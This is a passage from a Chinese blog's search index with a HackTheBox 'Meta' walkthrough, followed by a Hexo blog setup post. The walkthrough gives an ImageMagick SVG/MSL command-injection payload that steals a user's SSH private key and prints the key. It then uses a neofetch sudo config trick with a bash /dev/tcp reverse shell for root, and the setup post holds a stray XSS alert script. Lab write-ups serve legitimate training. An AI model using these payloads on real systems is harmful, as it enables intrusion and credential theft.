class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -al /dev/shm<br>ls -al /dev/shm<br>total 8<br>drwxrwxrwt  2 root     root       80 Mar 15 13:44 .<br>drwxr-xr-x 16 root     root     3080 Mar 15 13:33 ..<br>-rw-r--r--  1 thomas   thomas     54 Mar 15 13:44 0wned<br>-rw-r--r--  1 www-data www-data  406 Mar 15 13:39 poc.svg<br>www-data@meta:/dev/shm$ cat 0wned<br>cat 0wned<br>uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)<br></code></pre></td></tr></table></figure><p>现在把payload换成读取ssh_key</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;image authenticate=&#x27;ff&quot; `echo $(cat ~/.ssh/id_rsa)&gt; /dev/shm/id_rsa`;&quot;&#x27;&gt;<br>  &lt;read filename=&quot;pdf:/etc/passwd&quot;/&gt;<br>  &lt;get width=&quot;base-width&quot; height=&quot;base-height&quot; /&gt;<br>  &lt;resize geometry=&quot;400x400&quot; /&gt;<br>  &lt;write filename=&quot;test.png&quot; /&gt;<br>  &lt;svg width=&quot;700&quot; height=&quot;700&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;       <br>  &lt;image xlink:href=&quot;msl:poc.svg&quot; height=&quot;100&quot; width=&quot;100&quot;/&gt;<br>  &lt;/svg&gt;<br>&lt;/image&gt;<br></code></pre></td></tr></table></figure><p>重复一遍操作,吐槽下文件生成的好慢啊!!!</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/dev/shm$ ls -al<br>ls -al<br>total 16<br>drwxrwxrwt  2 root     root      120 Mar 15 14:10 .<br>drwxr-xr-x 16 root     root     3080 Mar 15 01:33 ..<br>-rw-r--r--  1 thomas   thomas     54 Mar 15 13:44 0wned<br>-rw-r--r--  1 thomas   thomas     54 Mar 15 13:53 0wned1<br>-rw-r--r--  1 thomas   thomas   2590 Mar 15 14:11 id_rsa<br>-rw-r--r--  1 www-data www-data  422 Mar 15 14:00 poc.svg<br>www-data@meta:/dev/shm$ cat id_rsa<br>cat id_rsa<br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5<br>x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV<br>qMgzqmJPFAdxmkD9WRnVP9OqEF0ZEYwTFuFPUlNq5hSbNRucwXEXbW0Wk7xdXwe3OJk8hu<br>ajeY80riz0S8+A+OywcXZg0HVFVli4/fAvS9Im4VCRmEfA7jwCuh6tl5JMxfi30uzzvke0<br>yvS1h9asqvkfY5+FX4D9BResbt9AXqm47ajWePksWBoUwhhENLN/1pOgQanK2BR/SC+YkP<br>nXRkOavHBxHccusftItOQuS0AEza8nfE5ioJmX5O9+fv8ChmnapyryKKn4QR4MAqqTqNIb<br>7xOWTT7Qmv3vw8TDZYz2dnlAOCc+ONWh8JJZHO9i8BXyHNwAH9qyESB7NlX2zJaAbIZgQs<br>Xkd7NTUnjOQosPTIDFSPD2EKLt2B1v3D/2DMqtsnAAAFgOcGpkXnBqZFAAAAB3NzaC1yc2<br>EAAAGBALfSKCOYB7c/KJobGmfRsvsF8jWT6eYyWb2zifeOjiOINpEUQxw5uce7qd8+bPx/<br>8ro4I4K6Djh4fcwQbomdSZ9Y5b3kTOx9VS27WPJP6zfTxXvzJEbGHR+OSL1ajIM6piTxQH<br>cZpA/VkZ1T/TqhBdGRGMExbhT1JTauYUmzUbnMFxF21tFpO8XV8HtziZPIbmo3mPNK4s9E<br>vPgPjssHF2YNB1RVZYuP3wL0vSJuFQkZhHwO48AroerZeSTMX4t9Ls875HtMr0tYfWrKr5<br>H2OfhV+A/QUXrG7fQF6puO2o1nj5LFgaFMIYRDSzf9aToEGpytgUf0gvmJD510ZDmrxwcR<br>3HLrH7SLTkLktABM2vJ3xOYqCZl+Tvfn7/AoZp2qcq8iip+EEeDAKqk6jSG+8Tlk0+0Jr9<br>78PEw2WM9nZ5QDgnPjjVofCSWRzvYvAV8hzcAB/ashEgezZV9syWgGyGYELF5HezU1J4zk<br>KLD0yAxUjw9hCi7dgdb9w/9gzKrbJwAAAAMBAAEAAAGAFlFwyCmMPkZv0o4Z3aMLPQkSyE<br>iGLInOdYbX6HOpdEz0exbfswybLtHtJQq6RsnuGYf5X8ThNyAB/gW8tf6f0rYDZtPSNyBc<br>eCn3+auUXnnaz1rM+77QCGXJFRxqVQCI7ZFRB2TYk4eVn2l0JGsqfrBENiifOfItq37ulv<br>kroghSgK9SE6jYNgPsp8B2YrgCF+laK6fa89lfrCqPZr0crSpFyop3wsMcC4rVb9m3uhwc<br>Bsf0BQAHL7Fp0PrzWsc+9AA14ATK4DR/g8JhwQOHzYEoe17iu7/iL7gxDwdlpK7CPhYlL5<br>Xj6bLPBGmRkszFdXLBPUrlKmWuwLUYoSx8sn3ZSny4jj8x0KoEgHqzKVh4hL0ccJWE8xWS<br>sLk1/G2x1FxU45+hhmmdG3eKzaRhZpc3hzYZXZC9ypjsFDAyG1ARC679vHnzTI13id29dG<br>n7JoPVwFv/97UYG2WKexo6DOMmbNuxaKkpetfsqsLAnqLf026UeD1PJYy46kvva1axAAAA<br>wQCWMIdnyPjk55Mjz3/AKUNBySvL5psWsLpx3DaWZ1XwH0uDzWqtMWOqYjenkyOrI1Y8ay<br>JfYAm4xkSmOTuEIvcXi6xkS/h67R/GT38zFaGnCHh13/zW0cZDnw5ZNbZ60VfueTcUn9Y3<br>8ZdWKtVUBsvb23Mu+wMyv87/Ju+GPuXwUi6mOcMy+iOBoFCLYkKaLJzUFngOg7664dUagx<br>I8qMpD6SQhkD8NWgcwU1DjFfUUdvRv5TnaOhmdNhH2jnr5HaUAAADBAN16q2wajrRH59vw<br>o2PFddXTIGLZj3HXn9U5W84AIetwxMFs27zvnNYFTd8YqSwBQzXTniwId4KOEmx7rnECoT<br>qmtSsqzxiKMLarkVJ+4aVELCRutaJPhpRC1nOL9HDKysDTlWNSr8fq2LiYwIku7caFosFM<br>N54zxGRo5NwbYOAxgFhRJh9DTmhFHJxSnx/6hiCWneRKpG4RCr80fFJMvbTod919eXD0GS<br>1xsBQdieqiJ66NOalf6uQ6STRxu6A3bwAAAMEA1Hjetdy+Zf0xZTkqmnF4yODqpAIMG9Um<br>j3Tcjs49usGlHbZb5yhySnucJU0vGpRiKBMqPeysaqGC47Ju/qSlyHnUz2yRPu+kvjFw19<br>keAmlMNeuMqgBO0guskmU25GX4O5Umt/IHqFHw99mcTGc/veEWIb8PUNV8p/sNaWUckEu9<br>M4ofDQ3csqhrNLlvA68QRPMaZ9bFgYjhB1A1pGxOmu9Do+LNu0qr2/GBcCvYY2kI4GFINe<br>bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>获取到私钥很nice!!!</p><p>这里还需要注意把本地的id_rsa权限改成600才能连接成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 600 id_rsa<br></code></pre></td></tr></table></figure><p>终端连接ssh妥妥的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(parallels㉿kali-linux-2021-3)-[~/Desktop/work/meta]<br>└─$ ssh thomas@10.10.11.140 -i id_rsa<br>Linux meta 4.19.0-17-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Tue Mar 15 14:25:20 2022 from 10.10.14.17<br>thomas@meta:~$ w<br> 14:30:00 up 12:57,  1 user,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>thomas   pts/5    10.10.14.17      14:27    0.00s  0.00s  0.00s w<br>thomas@meta:~$ <span class="hljs-built_in">id</span><br>uid=1000(thomas) gid=1000(thomas) <span class="hljs-built_in">groups</span>=1000(thomas)<br></code></pre></td></tr></table></figure><p>查看user.txt文件获取Flag</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">thomas@meta:~$ <span class="hljs-built_in">cat</span> user.txt <br>e4393d0aa3def6331ec9f41206703347<br></code></pre></td></tr></table></figure><h5 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">thomas@meta:~$ ls -al<br>total 36<br>drwxr-xr-x 5 thomas thomas 4096 Mar 15 14:25 .<br>drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..<br>lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout<br>-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc<br>drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config # 里面是一个neofetch<br>drwx------ 3 thomas thomas 4096 Mar 15 14:25 .gnupg # 密码学软件,与PGP类似<br>-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile<br>drwx------ 2 thomas thomas 4096 Jan  4 10:22 .ssh<br>-rw-r----- 1 root   thomas   33 Mar 15 01:33 user.txt<br><br></code></pre></td></tr></table></figure><p>发现可以root权限运行的程序neofetch(Neofetch 是一个简单但有用的命令行系统信息工具，它用 Bash 编写。它会收集有关系统软硬件的信息，并在终端中显示结果。)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">thomas@meta:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> thomas on meta:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,<br>    env_keep+=XDG_CONFIG_HOME<br><br>User thomas may run the following commands on meta:<br>    (root) NOPASSWD: /usr/bin/neofetch \&quot;\&quot; <span class="hljs-comment"># 这里</span><br><br></code></pre></td></tr></table></figure><p>这里利用.config&#x2F;neofetch&#x2F;config.conf配置文件提升权限</p><p>在文件中添加</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">/bin/bash -c <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.39/4444 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-17.png" alt="image"></p><p>设置XDG_CONFIG_HOME变量</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> XDG_CONFIG_HOME=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.config&quot;</span><br></code></pre></td></tr></table></figure><p>本地开启监听</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">nc -lvvp 4444 <br></code></pre></td></tr></table></figure><p>指定root去执行(这里-u参数应该可以不要)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo -u root /usr/bin/neofetch \&quot;\&quot;<br></code></pre></td></tr></table></figure><p>获取root权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(parallels㉿kali-linux-2021-3)-[~/Desktop]<br>└─$ nc -lvvp 4444                                                                                           1 ⨯<br>listening on [any] 4444 ...<br>connect to [10.10.14.39] from artcorp.htb [10.10.11.140] 45348<br>root@meta:/home/thomas<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>root@meta:/home/thomas<span class="hljs-comment"># cd ~</span><br><span class="hljs-built_in">cd</span> ~<br>root@meta:~<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>conf<br>root.txt<br>root@meta:~<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>11df04949c30506126899e46fd5245d8<br></code></pre></td></tr></table></figure><h3 id="0x05-知识小结"><a href="#0x05-知识小结" class="headerlink" title="0x05 知识小结"></a>0x05 知识小结</h3><ol><li>绑定hosts</li><li>Fuzz资产(ffuf工具)</li><li>文件上传解析漏洞(CVE-2021-22204-exiftool)拿shell</li><li>检索文件利用ImageMgick命令注入提权user</li><li>neofetch提root</li><li>一个好工具rlwrap，可以在shell里面上下翻动和删除</li></ol>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
      <tag>靶机系列</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GitHub Pages + Hexo搭建个人博客</title>
    <link href="/2022/01/25/GitHub%20Pages%20+%20Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2022/01/25/GitHub%20Pages%20+%20Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文介绍如何使用GitHub Pages + Hexo搭建个人博客网站，完全免费。</p><p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Heroku上，是搭建博客的首选框架。</p></blockquote><span id="more"></span><div class="note note-success">            <p>文字 或者 <code>markdown</code> 均可</p>          </div><div class="note note-warning">            <p>文字 或者 <code>markdown</code> 均可</p>          </div><span class="label label-primary">text</span>            <input type="checkbox" disabled checked="checked">text          <a class="btn" href="url"  title="title" target="_blank">text</a><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/url"></div><div class="group-image-wrap"><img src="/url"></div><div class="group-image-wrap"><img src="/url"></div></div><div class="group-image-row"><div class="group-image-wrap"><img src="/url"></div><div class="group-image-wrap"><img src="/url"></div></div></div><script>alert(\xss\)</script><p>待续。。。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
